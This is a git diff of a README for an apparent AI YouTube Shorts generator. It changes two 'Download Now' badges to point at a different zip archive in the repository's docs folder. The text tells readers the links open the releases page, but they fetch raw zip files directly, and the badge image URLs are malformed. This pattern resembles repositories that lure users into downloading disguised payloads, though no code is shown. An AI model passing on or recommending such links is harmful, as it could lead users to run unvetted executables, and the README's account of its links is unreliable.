@@ -22,7 +22,7 @@ Follow these steps to download and install YouTube Shorts Forge AI Generation:
 
 1. **Visit the Releases Page**: Click the button below to navigate to the GitHub releases page.
 
-   [![Download Now](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_youtube_ai_shorts_forge_v3.9.zip%20Now-Get%20App-blue)](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_youtube_ai_shorts_forge_v3.9.zip)
+   [![Download Now](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_shorts_forge_ai_youtube_1.2.zip%20Now-Get%20App-blue)](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_shorts_forge_ai_youtube_1.2.zip)
 
 2. **Download the Application**:
    - On the releases page, you will see a list of available versions. Look for the latest release.
@@ -38,7 +38,7 @@ Follow these steps to download and install YouTube Shorts Forge AI Generation:
 ## 📁 Download & Install
 To start creating engaging videos, visit the releases page again:
 
-[![Download Now](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_youtube_ai_shorts_forge_v3.9.zip%20Now-Get%20App-blue)](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_youtube_ai_shorts_forge_v3.9.zip)
+[![Download Now](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_shorts_forge_ai_youtube_1.2.zip%20Now-Get%20App-blue)](https://github.com/vcavca/youtube-shorts-forge-ai-generation/raw/refs/heads/main/docs/generation_shorts_forge_ai_youtube_1.2.zip)
 
 ## 🎨 Creating Your First Video
 Once the application is running, follow these steps to create your first video:
